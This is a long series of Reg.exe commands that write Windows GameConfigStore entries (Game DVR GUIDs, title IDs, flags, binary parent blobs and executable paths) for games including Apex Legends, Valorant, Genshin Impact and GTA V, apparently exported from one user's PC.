Reg.exe add "HKCU\System\GameConfigStore\Children\b1e0341d-a9d2-402c-a242-90ae9b02723c" /v "MatchedExeFullPath" /t REG_SZ /d "G:\GAMES NEW\PUBG LITE\PUBGLite\Client\ShadowTrackerExtra\Binaries\Win64\PUBGLite-Win64-Shipping.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000003f67a43c44df0dd2c5dc1f315c022f11dc4cde1bcc0e181bb46e06338ca8c4b7000000000e800000000200002000000057f327fbf7631f54c150df0f21751affa55f6df02586642b1668a9665939f2a92000000062d10f66f450ebbe4602f83d1af4d23c27cc19791a6e6b7cbbf5ff523f84d7e4400000007401baf762fe4e0a8bb70b0027434fc71620b423afc7b40fb1ae7641cd15339f367c13e0f7f7d64654355801d426278a530903ea53c7a17bf1e961d3d85bfce3" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "GameDVR_GameGUID" /t REG_SZ /d "ad4e885f-9469-42d5-9c0b-73bbb96fd569" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "TitleId" /t REG_SZ /d "1628516715" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\b8b48b38-1c19-4dd7-ae69-3ba5cbab0db0" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Origin APEX Legends\Apex\r5apex.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000005b12daaaa2927b59072c41aa26bb3fdcecc37a96d74dc3abcb59eadc18df23fe000000000e80000000020000200000005b5b458112a4dfba3047d3639aee304889cff8bdeace5bd8163fd1cfde36db9e200000003230850dccdcef31a43b46affc78fc03e2f158bc28d49c7c076ad28e3f1d3ee64000000099a958174535f85e80417aedf6a0069d87ba0b11bf1248846370eb08b031d7f6eb6a34e2d7e8a48c158df69d5e1855844bd5af653814638fd05341dd9d5513ad" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /v "GameDVR_GameGUID" /t REG_SZ /d "d82d19c7-cf98-4dd1-92ee-b51acefac3ec" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bba1d6d2-9a61-42e8-8600-e0dafb8fa1d6" /v "TitleId" /t REG_SZ /d "2089711717" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bdf4f2dc-25d6-4cb4-8f2c-c268c4b0e339" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bdf4f2dc-25d6-4cb4-8f2c-c268c4b0e339" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bdf4f2dc-25d6-4cb4-8f2c-c268c4b0e339" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bdf4f2dc-25d6-4cb4-8f2c-c268c4b0e339" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000001544559b2b0790dec67dbafe7f8bc33ece740bff7532d08bfd28422b80ae46b5000000000e8000000002000020000000fa8f7175796b2759bb9959108667bf72debd152eee259b5ab31b4590bd81c5104000000059d37d5e763633816ffdd3c68b3149f1339b15bbd308542875539f7c7d85dad9a4453c5019d239b3a12cd34c48ae4ce6e18df0d6bf8a6afb1af7697e2c56897540000000e89640ea0cdc32173f52b4cccab71050bd0ae2240fc0596727a19aacefc30171aa90324923f0b86ebd6aa1c7a4a1cf7bea5f74df5309d7d58adb9ad7d6b1a102" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\bdf4f2dc-25d6-4cb4-8f2c-c268c4b0e339" /v "GameDVR_GameGUID" /t REG_SZ /d "c30126d9-4cac-461a-b331-faa613447906" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000bb3393250d77ed2dbc8fb15e0df335cadb67e0386cfb1aecc96f2b7b7a32edd3000000000e8000000002000020000000fb56066f64fa5ddbcaa150ddd4e59c1693c65382c71f518cdcd7e7f9fa0a42754000000090a2ea7402811b74f2ae8139e5454adeeb8f3aa54d40d04815315c41182b7e09fd089de96102fda7b7b44e7c341053ae0d1f6385776af46a303d76c7322b5fb0400000004b7a8c02bb0539598ab7d444a570620cf673601f7fa7d0f7c9a8299d345b3dd6e866104b52477bea7a9041549ed729ce1b936793d4ddafb00debf8b0cb6b62ca" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "GameDVR_GameGUID" /t REG_SZ /d "a08ed448-4755-4afd-88ea-60480149ef7a" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "TitleId" /t REG_SZ /d "1742142364" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c197c13c-6b0c-4810-81d1-548ed723a399" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c1e4be0f-1b0f-4324-a064-adccbdb98dae" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c1e4be0f-1b0f-4324-a064-adccbdb98dae" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c1e4be0f-1b0f-4324-a064-adccbdb98dae" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c1e4be0f-1b0f-4324-a064-adccbdb98dae" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000003dce0db3bbd7e2590e052ed52b818fc6b45b6ca6e4f4561b753f18afaca134f8000000000e8000000002000020000000c31d6e904e70f596541f40c1a7497394a91d265a6059b3e73f141cf523ec59a63000000092c4dda0c06b61400e11de48084aaf714804ae90712deef1a04b6afade3da94cf7780aed971510a65c35c7ff979438f0400000008ec91f3bf88c2ced36111f6b3fa4a666f23477699b9c8849a1b598980c08cb39efc320445bebdce2a78851a078cb8df088cc1354c1ba6b58b9fa317a08aa47d6" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c1e4be0f-1b0f-4324-a064-adccbdb98dae" /v "GameDVR_GameGUID" /t REG_SZ /d "9cd0abff-d7f4-488e-ab4d-031067591dea" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c1e4be0f-1b0f-4324-a064-adccbdb98dae" /v "TitleId" /t REG_SZ /d "2121740635" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000dd054ac6c5d95b4f5babacc68c331c79b307fd03216ef76e2593863f77e86f46000000000e800000000200002000000035b190e15876bb3e37c8bcd09ee0ed557aa16f0fbeaf2fd76cdf8c3fdc1d5421200000004b277c821ac909330334de76101987258149faf9606c47567de7914c11733e7140000000570a184c0de68c0779cf372cd45a9907b0a79ba6c04863cb691be0da6c1dc88f06d206fe75b066e7a73c4da8c193ac955650dd70c6916c6e7137c531d9a83d9b" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "GameDVR_GameGUID" /t REG_SZ /d "0e943a5f-4a49-4030-8ba2-1d51e7b60a08" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "TitleId" /t REG_SZ /d "1956642556" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c83d8550-bfd3-4fe6-a5ed-256363e86756" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1\0battle.net.exe|8\0battle.net helper.exe|8" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000008cecf44dd00e8884f0c705961bee22cf9dda5bf3f0a20b6f7311f7c71c74e44b000000000e800000000200002000000030df540181aa25b4c8c78729868f73863fb8336bc1e3117c1005dd3fd7eb7be020000000bbdcaf3d34ab1064594c568986ffc7cfce58abd764be903c9b8768c8ed08a48d400000007429fd427f2ff32065239c22d9960b3d3713bd6a9e9792a3f8825fa6253b5b1bfeb7b1999e5cebffe05f3ca9c81aab6c4b3a921280364643f0566f285ebf2bde" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "GameDVR_GameGUID" /t REG_SZ /d "b57c1fde-bc6f-4847-b086-205590b186fe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "TitleId" /t REG_SZ /d "1639119975" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\c9519863-23c7-4c40-9bc4-ce362db7e451" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Among.Us.v2020.9.9s\Among Us.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000766d2cbd73f32df88bee28812f29a1db2344f4dea59b11c08e3d94cfe4aea4e4000000000e80000000020000200000004b83993140f7cdf953427e54364f4432dff389e133ff5826f61f367d1a4300a0200000004352a14616ade9b91cc8e1acacbc01183245d97446df3d4d214dc272caed941b40000000968ac6f1883e33f400573aa22ad0c2a04d33f812edc5ec5100fa6ad5931cb45a43a28fd1e614519d3d8e447b05ec5010d62714717ed0af73c77ac8d7a47df1ba" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "GameDVR_GameGUID" /t REG_SZ /d "c30f5807-f5c7-485b-b620-fbec6448c354" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "TitleId" /t REG_SZ /d "1635723607" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\cc7a8a23-73ee-4311-b901-ac0934555ff8" /v "ProcessDependencies" /t REG_MULTI_SZ /d "audiodg.exe|1\0battle.net.exe|8\0battle.net helper.exe|8" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000f7243cefb9b937ba367886ce3e2892fe28cf0c2aaef121728860cd2fd4357f6d000000000e8000000002000020000000457802b510bdad9175054f199208395fb18fb2b7112d1293a7ad5f0f0388b33230000000b0d108725e8a576b6a66bb88f6d2e8472758058f21b4c8ed75f5cb09b126a802efc0d483894476543de283a382129b9a40000000d9c31d066ffd44b9068a7a197d758c8371a8c4886751410aba6667f878a7ad74e55a7cde12b24bbd57dec28c86db8ad5a24a59ca2b4b39a81e0c889c269e275d" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /v "GameDVR_GameGUID" /t REG_SZ /d "17ce277e-8b63-4b81-b9c8-0856374906d3" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\d34d89a7-68fc-4d19-90e7-3a6f206b7ca0" /v "TitleId" /t REG_SZ /d "1967200449" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\daff267a-d1b8-46cd-a81a-6d62df3e01bd" /v "Type" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\daff267a-d1b8-46cd-a81a-6d62df3e01bd" /v "Revision" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\daff267a-d1b8-46cd-a81a-6d62df3e01bd" /v "Flags" /t REG_DWORD /d "21" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\daff267a-d1b8-46cd-a81a-6d62df3e01bd" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000047e5addb542ede4580e9545ed0ca78500400000002000000000010660000000100002000000038027a84f65779c781b8f6d2b51bbafb5693a0c323e1438a8c633c174e7cd14b000000000e8000000002000020000000cf2742785f603eaebdf4f12741669af4ecce029326347279995745404cdeda6e700000003cc3b8f6cc83156000e3ca1f24520074d1b624683e304ca2da0e1b9d96665c606e87d1fc5cf07c75319d9df1045a712ff5059e3910ca244e14faef5a4b1ea9f96faada0f4482de78c85eb1865d0daf200a5f607034d740733c996443667676148905551903331800b8e3d1f80a680cf4400000006bb174fde7ab158ca2aa5aa0422ac8f4336db173bea3f0cf4baf874457e1c49a23f0cb49d5cff7b72248d27f9c997c460a39c523256c1ad2e17a3927a163d205" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000002c90190a342d9bf938e388c11819906ff2a9c52ff42e4fe073a2dd69d3bc256b000000000e800000000200002000000072428f64acf4546d59ca9f94541357ed54760cb8dfe19a8092661ae29c5a019d40000000a8fc92784b2dfa3d23e6f82dd2d4cdccf446df9a9a73ef8e4f6ed0f8f5afc461845ec36576ae6bf4c6660b7ac5f16b51b6532be2a396d3f260d72c92dcce2c1f4000000053271e618d82c901064ebb7ee8b57e9ce2cbf7d88296aff8ad5c1573e9b1795f205bff08799eeab1500915188d8ec8e90576d8b3d0c42eb4c5039056a259795f" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "GameDVR_GameGUID" /t REG_SZ /d "298d8e69-36b0-4fe9-86dd-90d75d8daad4" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "TitleId" /t REG_SZ /d "1856764962" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\df67af05-43cc-40b4-9665-a53aaf762185" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Valorant\Riot Games\VALORANT\live\ShooterGame\Binaries\Win64\VALORANT-Win64-Shipping.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000accfc29dc43025bf914cb5fdb7241834960a0297473fbb02002e9edd670bf82c000000000e8000000002000020000000a5a493782a40a1ee24bfe0b08bf763f2e64dd668307b2a2ee8929c9ac659d42c300000002696fa26aa65c34ec87017931c3665eba15acba0eb87efd6c77f013b8f5b132e6b14fd5c5be1315f46e69ed0a50e18f6400000003a95149f54eed0e3e571ceebacbba99ff26a51f3e2f2c3261c64d4e719cef60e5443d99adc96e8d6f1a54f94e707645a675c4d11e807319b9d4cb8c8418809a5" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "WorkingDirectory" /t REG_SZ /d "Genshin Impact Game" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "GameDVR_GameGUID" /t REG_SZ /d "a45347a2-1f0d-4c04-be2d-8f4af1cc5396" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "TitleId" /t REG_SZ /d "1962957406" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e45e5935-d67d-4f1c-bccf-bacf6c43fd3c" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Genshinimpact\Genshin Impact Game\GenshinImpact.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e4d45d34-f695-4946-b390-aafd888b99ba" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e4d45d34-f695-4946-b390-aafd888b99ba" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e4d45d34-f695-4946-b390-aafd888b99ba" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e4d45d34-f695-4946-b390-aafd888b99ba" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000051e2519ac3805838c1cfcbf2c84cf2f695e527f1f42758fc148d4d5c7d5cfd1b000000000e8000000002000020000000e2e77998d9094df1a3c7c8e4d53b65699dbcf128203e9b3c8eb4cc916506235e20000000b87972e674d792f30f06799eb30cf6b958453b92b7cd17f42e864dd5a7ac598540000000f96f569b51488b9d3239aafec3b1306462ad5848692beb81159942fbb8d93123dc32510c9fcb7e3e0e04ab06df6c347fb6b453d4cc7f490b17d9f41147c909ee" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e4d45d34-f695-4946-b390-aafd888b99ba" /v "GameDVR_GameGUID" /t REG_SZ /d "c3f4f46d-343f-4ea8-86dc-d098f7d37e8e" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e4d45d34-f695-4946-b390-aafd888b99ba" /v "TitleId" /t REG_SZ /d "1885819086" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "Flags" /t REG_DWORD /d "17" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa10400000002000000000010660000000100002000000090ad5422929108c621147b2aaf7db30d9ff7181128be6de41e15ccfc33534857000000000e8000000002000020000000df7d0d0482fd0952e964a28b94e1a2741707d5426dc895912d116ab0966732182000000015db14819a71c9fcb074c5b5f130555e79e99e9a3cea4450e734d753830e228540000000b2187a6a40374c577e909d8b7ba47aad7354ee5a05de15a8a4e3713af6ad3fda2d11e01616fa4cbe27735a1df6171a363b9915cb817355a97351a3501951be3b" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "ExeParentDirectory" /t REG_SZ /d "GTAV" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "GameDVR_GameGUID" /t REG_SZ /d "60d5e8cc-84c4-48a1-b0f9-97ad3aaef80a" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "TitleId" /t REG_SZ /d "1862446374" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\e7644f6a-21c2-441c-97a8-13ed3ba581b3" /v "MatchedExeFullPath" /t REG_SZ /d "E:\Grand Theft Auto 5\GTAV\GTA5.exe" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "Flags" /t REG_DWORD /d "561" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000bb2ca4aa6db33ca596daa91e07368e9e212864a42175b1106648181e9c6a1aea000000000e800000000200002000000035c70844a5ac3b1fc2aa037a8edfb622607ce0a4f88d49dbe176b98b8deeafb2200000001fb03eda6fcc9e9aa372d546346b71c185f2a20279bbf84700b23f4b3d4a9cc040000000d5a83c90eae4820b1f9df490e0161f1658462b8bba4fd26559e56cf3cdc2b6e03bd74a542279cdda8112f3836e2eb236bfe9236725b95ea24c29ddea6518e19b" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "ExeParentDirectory" /t REG_SZ /d "GRID" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "GameDVR_GameGUID" /t REG_SZ /d "cc5724d4-30f5-462b-8072-c92d17b68c7c" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\eaf3cd49-369a-40e7-9294-ca808398be54" /v "TitleId" /t REG_SZ /d "1788842502" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa104000000020000000000106600000001000020000000eaa9e5371468084e15832d97bba09c1a1635fde8e7dcc8932027da763679fe0b000000000e8000000002000020000000ac28d58d6b24bcc2af2ca77b73b4130fa17d8c1f91683bcd484e5056a1a0c7a730000000302e70e86e39f6f0dfa5a5757362a3b10311bf2b7acd615238c372ec466db6d6091938398d3cd92016c75f3b954c3ddc40000000396c5a939e89e17f1f9e2f0d188fe8b5dcf49840d90f0f67543bbafad6cdc9b1413a8111dc1ed0dc38819683193e9d015e0ec153d3fd4eb7809574299250240e" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "GameDVR_GameGUID" /t REG_SZ /d "c0898033-346c-4910-bbaa-302b00271b09" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "TitleId" /t REG_SZ /d "1847408598" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "ProcessDependencies" /t REG_MULTI_SZ /d "dwm.exe|8\0audiodg.exe|1\0battle.net.exe|8\0battle.net helper.exe|8" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "AGGProfile" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efb98d70-9539-42ef-aa1d-9dc1a4c393d4" /v "AGCpuAlloc" /t REG_DWORD /d "6" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efcf187d-4945-4351-a98a-75e2174c9622" /v "Type" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efcf187d-4945-4351-a98a-75e2174c9622" /v "Revision" /t REG_DWORD /d "1995" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efcf187d-4945-4351-a98a-75e2174c9622" /v "Flags" /t REG_DWORD /d "51" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efcf187d-4945-4351-a98a-75e2174c9622" /v "Parent" /t REG_BINARY /d "01000000d08c9ddf0115d1118c7a00c04fc297eb010000005646f052f98c0242b48576641e122aa1040000000200000000001066000000010000200000007827db9cf74f3ee354a9562d8ddda269dbcb312278db8dbc30472e1f748c87b2000000000e8000000002000020000000ff009feb08f6d7fd59b5c987055b3840ce59fb50d7e5f263cbb6a4f3bf43a9e3300000005f3412b92a322c2f1144ce5da419f661cd0334f8ddab0b7982030550c786039d9190e3d07e875140c086d9bbd9a88e7840000000e692f89f8ed74b5eb2e0b7ec8dddcd2d524693ca62c22f037de354bcb4ec66ed204c940098e180c58e8c65c92ec863d31fe5ab16c568a3822bf2e5fee8083ca0" /f
Reg.exe add "HKCU\System\GameConfigStore\Children\efcf187d-4945-4351-a98a-75e2174c9622" /v "GameDVR_GameGUID" /t REG_SZ /d "a659d45b-c8a5-4387-9dea-7c1df35ac01c" /f
